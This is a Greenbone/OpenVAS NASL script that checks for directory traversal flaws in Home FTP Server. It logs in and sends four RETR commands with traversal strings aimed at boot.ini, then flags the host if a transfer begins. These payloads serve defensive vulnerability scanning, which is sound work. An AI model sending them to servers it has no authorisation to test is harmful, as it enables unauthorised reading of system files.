# Copyright (C) 2010 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902270");
  script_version("2022-05-02T09:35:37+0000");
  script_tag(name:"last_modification", value:"2022-05-02 09:35:37 +0000 (Mon, 02 May 2022)");
  script_tag(name:"creation_date", value:"2010-11-02 18:01:36 +0100 (Tue, 02 Nov 2010)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_name("Home FTP Server Multiple Directory Traversal Vulnerabilities");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/15349/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/44543");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_family("FTP");
  script_dependencies("ftpserver_detect_type_nd_version.nasl", "os_detection.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("Host/runs_windows", "ftp/home_ftp/detected");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to read arbitrary
  files on the affected application.");

  script_tag(name:"affected", value:"Home FTP Server version 1.10.3 build 144 and 1.11.1 build 149.");

  script_tag(name:"insight", value:"The flaw is due to an error while handling certain requests
  which can be exploited to download arbitrary files from the host system.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"Home Ftp Server is prone to directory traversal vulnerabilities.");

  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}

include("ftp_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

ftpPort = ftp_get_port(default:21);
banner = ftp_get_banner(port:ftpPort);
if(! banner || "Home Ftp Server" >!< banner)
  exit(0);

soc1 = open_sock_tcp(ftpPort);
if(!soc1)
  exit(0);

kb_creds = ftp_get_kb_creds();
user = kb_creds["login"];
pass = kb_creds["pass"];

login_details = ftp_log_in(socket:soc1, user:user, pass:pass);
if(login_details)
{

  exploits = make_list("RETR  /..\/..\/..\/..\boot.ini",
                       "RETR ..//..//..//..//boot.ini",
                       "RETR \\\..\..\..\..\..\..\boot.ini",
                       "RETR ../../../../../../../../../../../../../boot.ini");

  result = ftp_send_cmd(socket: soc1, cmd:"PASV");

  foreach exp (exploits)
  {
    result = ftp_send_cmd(socket: soc1, cmd:exp);
    if("150 Opening data connection" >< result)
    {
      security_message(ftpPort);
      exit(0);
    }
  }
  ftp_close(socket:soc1);
}
